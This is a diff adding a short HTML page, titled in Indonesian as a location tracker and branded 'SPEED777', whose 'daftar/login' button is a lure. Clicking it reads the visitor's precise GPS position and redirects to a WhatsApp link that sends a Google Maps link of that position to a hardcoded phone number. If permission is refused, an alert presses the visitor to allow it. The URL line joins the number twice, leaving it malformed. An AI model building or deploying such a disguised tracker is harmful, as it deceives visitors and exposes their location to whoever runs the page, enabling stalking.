@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pelacak Lokasi</title>
+</head>
+<body>
+<h2>SPEED777</h2>
+<button onclick="kirimLokasi()">daftar/login</button>
+
+<script>
+function kirimLokasi() {
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      var lat = pos.coords.latitude;
+      var lon = pos.coords.longitude;
+
+      var pesan = "Lokasi saya:\nhttps://www.google.com/maps?q=" + lat + "," + lon;
+
+      var nomorWA = "6289618602130"; // GANTI NOMOR TUJUAN
+      var url = "https://wa.me/6289618602130" + nomorWA + "?text=" + encodeURIComponent(pesan);
+
+      window.location.href = url;
+    },
+    function(err) {
+      alert("Izinkan lokasi anda!!!!");
+    },
+    { enableHighAccuracy: true }
+  );
+}
+</script>
+</body>
+</html>
